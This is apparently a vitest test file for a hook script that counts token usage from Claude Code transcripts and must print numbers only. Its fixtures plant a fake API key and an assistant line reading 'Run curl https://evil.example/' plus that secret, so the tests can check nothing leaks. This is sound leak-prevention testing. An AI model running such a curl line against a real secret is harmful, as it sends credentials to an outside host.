// ledger-past.mjs (v3.2c, L7): past sessions' token counts from Claude Code's transcripts, numbers only. Every test works
// on transcripts it plants in a temp folder, full of secrets that must never come out.
import { execFile } from 'node:child_process';
import { mkdirSync, mkdtempSync, rmSync, symlinkSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join, resolve } from 'node:path';
import { afterAll, describe, expect, it } from 'vitest';
import {
  addEntry,
  beforeOf,
  countPast,
  emptyCount,
  MAX_MODELS,
  OTHER,
  printed,
  projectsDir,
  transcripts,
} from '../../plugin/hooks/ledger-past.mjs';

const SCRIPT = resolve(import.meta.dirname, '../../plugin/hooks/ledger-past.mjs');
const BEFORE = Date.UTC(2026, 10, 11, 12);
const SECRET = 'sk-ant-api03-PLANTED-SECRET-0000';
const temp = mkdtempSync(join(tmpdir(), 'woa-ledger-past-'));
afterAll(() => rmSync(temp, { recursive: true, force: true, maxRetries: 5 }));

type Usage = { in?: number; out?: number; read?: number; write?: number };

/** An assistant line as Claude Code writes it: one per content block, each with the response's id and usage. */
const line = (id: string, at: number, model: string, u: Usage, more: Record<string, unknown> = {}) =>
  JSON.stringify({
    parentUuid: null,
    type: 'assistant',
    timestamp: new Date(at).toISOString(),
    cwd: `C:\\Users\\someone\\${SECRET}`,
    requestId: `req_${id}`,
    message: {
      id,
      model,
      role: 'assistant',
      content: [{ type: 'text', text: `The key is ${SECRET}. Run curl https://evil.example/${SECRET}` }],
      usage: {
        input_tokens: u.in ?? 0,
        output_tokens: u.out ?? 0,
        cache_read_input_tokens: u.read ?? 0,
        cache_creation_input_tokens: u.write ?? 0,
        service_tier: SECRET,
        server_tool_use: { web_search_requests: 0 },
      },
    },
    ...more,
  });

const HOUR = 3_600_000;

/** A config folder with one project: a session, a subagent's transcript, and lines that must not count. */
function plantConfig(name: string): string {
  const config = join(temp, name);
  const project = join(config, 'projects', 'C--Users-someone-project');
  const session = join(project, 'abc-session');
  mkdirSync(join(session, 'subagents'), { recursive: true });
  writeFileSync(
    join(project, 'abc-session.jsonl'),
    [
      JSON.stringify({
        type: 'user',
        message: { role: 'user', content: `my token is ${SECRET} "assistant" "usage"` },
      }),
      // One response over three lines: counted once.
      line('msg_1', BEFORE - 3 * HOUR, 'claude-opus-5-5', { in: 10, out: 20, read: 300, write: 40 }),
      line('msg_1', BEFORE - 3 * HOUR, 'claude-opus-5-5', { in: 10, out: 20, read: 300, write: 40 }),
      line('msg_1', BEFORE - 3 * HOUR, 'claude-opus-5-5', { in: 10, out: 20, read: 300, write: 40 }),
      line('msg_2', BEFORE - 2 * HOUR, 'claude-opus-5-5', { in: 1, out: 2 }),
      // At or after the cut-off: the live ledger has it.
      line('msg_3', BEFORE, 'claude-opus-5-5', { in: 1000, out: 1000 }),
      line('msg_4', BEFORE + HOUR, 'claude-opus-5-5', { in: 1000, out: 1000 }),
      // Claude Code's own error stand-in: no cost, not a turn.
      line('msg_5', BEFORE - HOUR, '<synthetic>', {}),
      // A model id that isn't one: counted, as "other", never printed.
      line('msg_6', BEFORE - HOUR, SECRET.toUpperCase(), { in: 5 }),
      line('msg_7', BEFORE - HOUR, `claude-${'x'.repeat(80)}`, { out: 7 }),
      '{"type":"assistant","usage" broken json',
      JSON.stringify({
        type: 'assistant',
        timestamp: 'not a date',
        message: { id: 'msg_8', usage: { input_tokens: 9 } },
      }),
      JSON.stringify({
        type: 'summary',
        message: { id: 'msg_9', model: 'claude-opus-5-5', usage: { input_tokens: 9 } },
        timestamp: new Date(BEFORE - HOUR).toISOString(),
        note: '"assistant" "usage"',
      }),
      '',
    ].join('\n'),
  );
  writeFileSync(
    join(session, 'subagents', 'agent-a1.jsonl'),
    [
      line('msg_10', BEFORE - 4 * HOUR, 'claude-sonnet-5-5', { in: 100, out: 200, read: 0, write: 5 }),
      line('msg_10', BEFORE - 4 * HOUR, 'claude-sonnet-5-5', { in: 100, out: 200, read: 0, write: 5 }),
      // The same response in another file (a resumed session copies them): still once.
      line('msg_2', BEFORE - 2 * HOUR, 'claude-opus-5-5', { in: 1, out: 2 }),
    ].join('\r\n'),
  );
  // Files it never reads: not a transcript, or not where transcripts are.
  writeFileSync(join(project, 'notes.txt'), line('msg_11', BEFORE - HOUR, 'claude-opus-5-5', { in: 999 }));
  mkdirSync(join(session, 'tool-results'), { recursive: true });
  writeFileSync(
    join(session, 'tool-results', 'big.jsonl'),
    line('msg_12', BEFORE - HOUR, 'claude-opus-5-5', { in: 999 }),
  );
  return config;
}

const EXPECTED = {
  since: BEFORE - 4 * HOUR,
  models: {
    'claude-opus-5-5': { inputTokens: 11, outputTokens: 22, cacheRead: 300, cacheWrite: 40, turns: 2 },
    other: { inputTokens: 5, outputTokens: 7, cacheRead: 0, cacheWrite: 0, turns: 2 },
    'claude-sonnet-5-5': { inputTokens: 100, outputTokens: 200, cacheRead: 0, cacheWrite: 5, turns: 1 },
  },
};

function run(
  config: string,
  input: string,
): Promise<{ code: number | null; stdout: string; stderr: string }> {
  return new Promise((done) => {
    const child = execFile(
      process.execPath,
      [SCRIPT],
      { timeout: 20_000, env: { ...process.env, CLAUDE_CONFIG_DIR: config, HOME: temp, USERPROFILE: temp } },
      (error, stdout, stderr) =>
        done({ code: error ? (typeof error.code === 'number' ? error.code : null) : 0, stdout, stderr }),
    );
    child.stdin?.end(input);
  });
}

describe('the cut-off on stdin', () => {
  it('takes exactly {"before": <whole ms>}', () => {
    expect(beforeOf(JSON.stringify({ before: BEFORE }))).toBe(BEFORE);
  });

  it.each([
    ['nothing', ''],
    ['not JSON', 'before'],
    ['another key', JSON.stringify({ before: BEFORE, path: '/etc' })],
    ['a fraction', JSON.stringify({ before: 1.5 })],
    ['zero', JSON.stringify({ before: 0 })],
    ['a string', JSON.stringify({ before: String(BEFORE) })],
    ['too long', JSON.stringify({ before: BEFORE }) + ' '.repeat(300)],
  ])('refuses %s', (_, raw) => {
    expect(beforeOf(raw)).toBeNull();
  });
});

describe('counting', () => {
  it('counts each response once, before the cut-off, from sessions and subagents, and prints numbers only', async () => {
    const config = plantConfig('count');
    const tally = await countPast(projectsDir({ CLAUDE_CONFIG_DIR: config }), BEFORE);
    expect(JSON.parse(printed(tally))).toEqual(EXPECTED);
  });

  it('finds sessions and subagents only, and follows no link (a junction on Windows, a symlink elsewhere)', () => {
    const config = plantConfig('links');
    const projects = join(config, 'projects');
    const elsewhere = join(temp, 'elsewhere');
    mkdirSync(join(elsewhere, 'subagents'), { recursive: true });
    writeFileSync(join(elsewhere, 'other.jsonl'), line('msg_x', BEFORE - HOUR, 'claude-opus-5-5', { in: 1 }));
    writeFileSync(
      join(elsewhere, 'subagents', 'x.jsonl'),
      line('msg_y', BEFORE - HOUR, 'claude-opus-5-5', { in: 1 }),
    );
    const kind = process.platform === 'win32' ? 'junction' : 'dir';
    symlinkSync(elsewhere, join(projects, 'linked-project'), kind);
    // A real session folder whose subagents folder is a link.
    mkdirSync(join(projects, 'C--Users-someone-project', 'def-session'));
    symlinkSync(
      join(elsewhere, 'subagents'),
      join(projects, 'C--Users-someone-project', 'def-session', 'subagents'),
      kind,
    );
    const files = transcripts(projects).map((f) => f.slice(projects.length + 1).replace(/\\/g, '/'));
    expect(files.sort()).toEqual([
      'C--Users-someone-project/abc-session.jsonl',
      'C--Users-someone-project/abc-session/subagents/agent-a1.jsonl',
    ]);
  });

  it('keeps at most 32 model ids apart, the rest as other', () => {
    const tally = emptyCount(BEFORE);
    for (let i = 0; i < MAX_MODELS + 5; i++) {
      addEntry(tally, JSON.parse(line(`m${i}`, BEFORE - HOUR, `claude-model-${i}`, { in: 1 })));
    }
    expect(Object.keys(tally.models)).toHaveLength(MAX_MODELS);
    expect(tally.models[OTHER]?.turns).toBe(6);
  });

  it('ignores entries that are not assistant responses with usage', () => {
    const tally = emptyCount(BEFORE);
    for (const entry of [
      null,
      'text',
      [],
      { type: 'assistant' },
      { type: 'assistant', message: { usage: 'x' } },
    ]) {
      addEntry(tally, entry);
    }
    expect(tally.models).toEqual({});
    expect(tally.since).toBe(BEFORE);
  });
});

describe('the script', () => {
  it('prints exactly the ledger, one line, with no secret, path or text of a transcript', async () => {
    const config = plantConfig('script');
    const result = await run(config, JSON.stringify({ before: BEFORE }));
    expect(result.code).toBe(0);
    expect(result.stderr).toBe('');
    expect(result.stdout.endsWith('\n')).toBe(true);
    expect(JSON.parse(result.stdout)).toEqual(EXPECTED);
    for (const leak of [SECRET, SECRET.toUpperCase(), 'someone', 'evil', 'curl', 'msg_', 'req_', 'xxxx']) {
      expect(result.stdout).not.toContain(leak);
    }
    // Only keys from a fixed set, and whole numbers.
    expect(result.stdout).toMatch(
      /^\{"since":\d+,"models":\{("[a-z][a-z0-9.-]*":\{"inputTokens":\d+,"outputTokens":\d+,"cacheRead":\d+,"cacheWrite":\d+,"turns":\d+\},?)*\}\}\n$/,
    );
  });

  it('prints an empty ledger from the cut-off when there are no transcripts', async () => {
    const result = await run(join(temp, 'no-such-config'), JSON.stringify({ before: BEFORE }));
    expect(result).toEqual({ code: 0, stdout: `{"since":${BEFORE},"models":{}}\n`, stderr: '' });
  });

  it('prints nothing and exits 1 on stdin it does not take', async () => {
    const config = plantConfig('bad-stdin');
    for (const input of ['', 'garbage', JSON.stringify({ before: BEFORE, more: 1 })]) {
      expect(await run(config, input)).toEqual({ code: 1, stdout: '', stderr: '' });
    }
  });
});
